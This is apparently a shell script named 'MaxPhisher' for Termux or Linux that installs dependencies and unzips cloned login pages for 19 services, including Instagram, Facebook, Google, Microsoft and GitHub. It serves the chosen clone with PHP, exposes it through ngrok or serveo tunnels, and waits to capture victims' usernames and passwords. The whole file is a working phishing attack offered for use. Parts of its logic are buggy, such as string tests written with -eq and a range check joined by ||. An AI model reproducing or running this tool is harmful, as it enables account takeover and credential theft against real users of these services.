#!/system/bin/sh
# MaxPhisher v1.1

trap 'printf "\n";stop;exit 1' 2

setup() {
    read -p $'\n\e[1;94m Are You Running This Tool On Termux? (Y/N): \e[0m' ostype

    if [[ $ostype -eq 'Y' || $ostype -eq 'y' ]]; then
        echo -e "\e[4;96m Installing Dependencies.... \e[0m"
        sleep 0.5
        echo -e "\e[1;95m"
        apt install openssh curl php toilet figlet unzip
        touch plugins.installed
        echo -e "\e[3;96m Dependencies Installed!"
        sleep 2
    elif [[ $ostype -eq 'N' || $ostype -eq 'n' ]]; then
        echo -e "\e[4;95m Installing Dependencies.... \e[0m"
        sleep 0.5
        echo -e "\[1;95m"
        sudo apt install curl php toilet figlet unzip
        touch plugins.installed
        echo -e "\e[3;96m Dependencies Installed!"
        sleep 2
    fi

    if [ -e "sites/" ]; then
        echo -e "\e[1;93m Starting Tool...."
        sleep 3
        clear
    else
        unzip sites.zip
        echo -e "\e[1;93m Starting Tool...."
        sleep 3
        clear
    fi
}

menu() {
    printf "\e[1;36m[\e[0m\e[1;92m01\e[0m\e[1;36m]\e[0m\e[1;34m Instagram\e[0m      \e[1;36m[\e[0m\e[1;92m09\e[0m\e[1;36m]\e[0m\e[1;34m Origin\e[0m          \e[1;36m[\e[0m\e[1;92m17\e[0m\e[1;36m]\e[0m\e[1;34m Gitlab\e[0m\n"
    printf "\e[1;36m[\e[0m\e[1;92m02\e[0m\e[1;36m]\e[0m\e[1;34m Facebook\e[0m       \e[1;36m[\e[0m\e[1;92m10\e[0m\e[1;36m]\e[0m\e[1;34m Steam\e[0m           \e[1;36m[\e[0m\e[1;92m18\e[0m\e[1;36m]\e[0m\e[1;34m Pinterest\e[0m\n"
    printf "\e[1;36m[\e[0m\e[1;92m03\e[0m\e[1;36m]\e[0m\e[1;34m Snapchat\e[0m       \e[1;36m[\e[0m\e[1;92m11\e[0m\e[1;36m]\e[0m\e[1;34m Yahoo\e[0m           \e[1;36m[\e[0m\e[1;92m19\e[0m\e[1;36m]\e[0m\e[1;34m Custom\e[0m\n"
    printf "\e[1;36m[\e[0m\e[1;92m04\e[0m\e[1;36m]\e[0m\e[1;34m Twitter\e[0m        \e[1;36m[\e[0m\e[1;92m12\e[0m\e[1;36m]\e[0m\e[1;34m Linkedin\e[0m        \e[1;36m[\e[0m\e[1;92m99\e[0m\e[1;36m]\e[0m\e[1;34m Exit\e[0m\n"
    printf "\e[1;36m[\e[0m\e[1;92m05\e[0m\e[1;36m]\e[0m\e[1;34m Github\e[0m         \e[1;36m[\e[0m\e[1;92m13\e[0m\e[1;36m]\e[0m\e[1;34m Protonmail\e[0m\n"
    printf "\e[1;36m[\e[0m\e[1;92m06\e[0m\e[1;36m]\e[0m\e[1;34m Google\e[0m         \e[1;36m[\e[0m\e[1;92m14\e[0m\e[1;36m]\e[0m\e[1;34m Wordpress\e[0m\n"
    printf "\e[1;36m[\e[0m\e[1;92m07\e[0m\e[1;36m]\e[0m\e[1;34m Spotify\e[0m        \e[1;36m[\e[0m\e[1;92m15\e[0m\e[1;36m]\e[0m\e[1;34m Microsoft\e[0m\n"
    printf "\e[1;36m[\e[0m\e[1;92m08\e[0m\e[1;36m]\e[0m\e[1;34m Netflix\e[0m        \e[1;36m[\e[0m\e[1;92m16\e[0m\e[1;36m]\e[0m\e[1;34m InstaFollowers\e[0m\n"
    read -p $'\n\e[1;36m[\e[0m\e[1;92m*\e[0m\e[1;36m] Choose any social media platform: \e[0m' options

    if [[ $options -ge 01 || $options -le 19 ]]; then
        printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Select one of the options below:\e[0m\n"
        printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Port Forwarding Using Ngrok (1)\e[0m\n"
        printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Port Forwarding Using Serveo (2)\e[0m\n"
        read -p $'\e[1;36m[\e[0m\e[1;92m*\e[0m\e[1;36m] Choose an option: \e[0m' type
        case $type in
            1)
                ngrok http 8080 > /dev/null &
                ;;
            2)
                ssh -R 80:localhost:8080 serveo.net > /dev/null &
                ;;
            *)
                echo -e "\e[1;91m [!] Invalid option! Please try again.\e[0m"
                menu
                ;;
        esac

        link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | jq -r .tunnels[0].public_url)

        case $options in
            01)
                echo -e "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting Instagram phishing attack....\e[0m\n"
                sleep 2
                cd sites/www.instagram.com/
                ;;
            02)
                echo -e "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting Facebook phishing attack....\e[0m\n"
                sleep 2
                cd sites/m.facebook.com/
                ;;
            03)
                echo -e "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting Snapchat phishing attack....\e[0m\n"
                sleep 2
                cd sites/www.snapchat.com/
                ;;
            04)
                echo -e "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting Twitter phishing attack....\e[0m\n"
                sleep 2
                cd sites/www.twitter.com/
                ;;
            05)
                echo -e "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting Github phishing attack....\e[0m\n"
                sleep 2
                cd sites/github.com/
                ;;
            06)
                echo -e "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting Google phishing attack....\e[0m\n"
                sleep 2
                cd sites/accounts.google.com/
                ;;
            07)
                echo -e "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting Spotify phishing attack....\e[0m\n"
                sleep 2
                cd sites/accounts.spotify.com/
                ;;
            08)
                echo -e "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting Netflix phishing attack....\e[0m\n"
                sleep 2
                cd sites/www.netflix.com/
                ;;
            09)
                echo -e "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting Origin phishing attack....\e[0m\n"
                sleep 2
                cd sites/origin.com/
                ;;
            10)
                echo -e "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting Steam phishing attack....\e[0m\n"
                sleep 2
                cd sites/steamcommunity.com/
                ;;
            11)
                echo -e "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting Yahoo phishing attack....\e[0m\n"
                sleep 2
                cd sites/login.yahoo.com/
                ;;
            12)
                echo -e "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting Linkedin phishing attack....\e[0m\n"
                sleep 2
                cd sites/www.linkedin.com/
                ;;
            13)
                echo -e "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting Protonmail phishing attack....\e[0m\n"
                sleep 2
                cd sites/mail.protonmail.com/
                ;;
            14)
                echo -e "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting Wordpress phishing attack....\e[0m\n"
                sleep 2
                cd sites/wordpress.com/
                ;;
            15)
                echo -e "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting Microsoft phishing attack....\e[0m\n"
                sleep 2
                cd sites/login.microsoftonline.com/
                ;;
            16)
                echo -e "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting InstaFollowers phishing attack....\e[0m\n"
                sleep 2
                cd sites/www.instafollowerspro.com/
                ;;
            17)
                echo -e "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting Gitlab phishing attack....\e[0m\n"
                sleep 2
                cd sites/gitlab.com/
                ;;
            18)
                echo -e "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting Pinterest phishing attack....\e[0m\n"
                sleep 2
                cd sites/www.pinterest.com/
                ;;
            19)
                echo -e "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Enter any custom phishing URL....\e[0m\n"
                sleep 2
                read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Enter the custom URL: \e[0m' website
                ;;
            *)
                echo -e "\e[1;91m [!] Invalid option! Please try again.\e[0m"
                menu
                ;;
        esac

        cp -r * /data/data/com.termux/files/home
        printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Direct link: \e[0m\e[1;77m$link\e[0m\n"
        printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for the credentials (Username/Email & Password)....\e[0m\n"
        printf "\e[1;77m\e[0m"
        php -S 127.0.0.1:8080 > /dev/null 2>&1 &
        ./ngrok http 127.0.0.1:8080 > /dev/null 2>&1 &
        ./serveo.net -port=8080 > /dev/null 2>&1 &
        if [[ -e /data/data/com.termux/files/usr/bin/termux-notification ]]; then
            termux-notification --title "Waiting For Credentials" --content "Port Forwarded!" > /dev/null 2>&1
        else
            printf "\e[1;91m [!] Please forward the generated phishing link manually!\e[0m\n"
        fi
        printf "\n"
        printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Press CTRL + Z to exit.\e[0m\n"
        printf "\n"
        printf "\e[1;77m\e[0m"
        fg 1
    else
        echo -e "\e[1;91m [!] Invalid option! Please try again.\e[0m"
        menu
    fi
}

clear
sleep 2
printf "\e[1;93m"
toilet -f ivrit 'MaxPhisher' | lolcat
printf "\e[1;92m    Version : \e[0m\e[1;77mv1.1\e[0m\n"
printf "\n"
printf "\e[1;92m [!] \e[0m\e[1;77mAuthor   : \e[0m\e[1;77mSathvik\e[0m\n"
printf "\n"
printf "\e[1;77m # \e[0m\e[1;92mPlease subscribe to the channel\e[0m\e[1;77m :\e[0m\e[1;77m Sathvik\e[0m\n"
printf "\e[1;77m # \e[0m\e[1;92mGithub\e[0m\e[1;77m :\e[0m\e[1;77m https://github.com/sathvikks\e[0m\n"
printf "\n"
sleep 4
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Checking For Ngrok\e[0m\e[1;77m:\e[0m\e[1;93m...\e[0m\n"
if [[ -e ngrok ]]; then
    printf "\e[1;92m[\e[0m+\e[1;92m] Ngrok Found!\e[0m\n"
    sleep 2
else
    printf "\e[1;91m[!] Ngrok Not Found!\e[0m\n"
    sleep 2
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Downloading Ngrok...\e[0m\n"
    wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
    unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
    chmod +x ngrok
    sleep 2
    printf "\e[1;92m[\e[0m+\e[1;92m] Ngrok Successfully Downloaded!\e[0m\n"
fi
sleep 2
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Checking For PHP\e[0m\e[1;77m:\e[0m\e[1;93m...\e[0m\n"
if [[ -e /data/data/com.termux/files/usr/bin/php ]]; then
    printf "\e[1;92m[\e[0m+\e[1;92m] PHP Found!\e[0m\n"
    sleep 2
else
    printf "\e[1;91m[!] PHP Not Found!\e[0m\n"
    sleep 2
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Installing PHP....\e[0m\n"
    apt-get -y install php > /dev/null 2>&1
    sleep 2
    printf "\e[1;92m[\e[0m+\e[1;92m] PHP Successfully Installed!\e[0m\n"
fi
sleep 2
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Checking For Curl\e[0m\e[1;77m:\e[0m\e[1;93m...\e[0m\n"
if [[ -e /data/data/com.termux/files/usr/bin/curl ]]; then
    printf "\e[1;92m[\e[0m+\e[1;92m] Curl Found!\e[0m\n"
    sleep 2
else
    printf "\e[1;91m[!] Curl Not Found!\e[0m\n"
    sleep 2
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Installing Curl....\e[0m\n"
    apt-get -y install curl > /dev/null 2>&1
    sleep 2
    printf "\e[1;92m[\e[0m+\e[1;92m] Curl Successfully Installed!\e[0m\n"
fi
sleep 2
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Checking For Openssh\e[0m\e[1;77m:\e[0m\e[1;93m...\e[0m\n"
if [[ -e /data/data/com.termux/files/usr/bin/ssh ]]; then
    printf "\e[1;92m[\e[0m+\e[1;92m] Openssh Found!\e[0m\n"
    sleep 2
else
    printf "\e[1;91m[!] Openssh Not Found!\e[0m\n"
    sleep 2
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Installing Openssh....\e[0m\n"
    apt-get -y install openssh > /dev/null 2>&1
    sleep 2
    printf "\e[1;92m[\e[0m+\e[1;92m] Openssh Successfully Installed!\e[0m\n"
fi
sleep 2
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Checking For Wget\e[0m\e[1;77m:\e[0m\e[1;93m...\e[0m\n"
if [[ -e /data/data/com.termux/files/usr/bin/wget ]]; then
    printf "\e[1;92m[\e[0m+\e[1;92m] Wget Found!\e[0m\n"
    sleep 2
else
    printf "\e[1;91m[!] Wget Not Found!\e[0m\n"
    sleep 2
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Installing Wget....\e[0m\n"
    apt-get -y install wget > /dev/null 2>&1
    sleep 2
    printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Wget Successfully Installed!\e[0m\n"
fi
sleep 2
printf "\n"
setup
menu
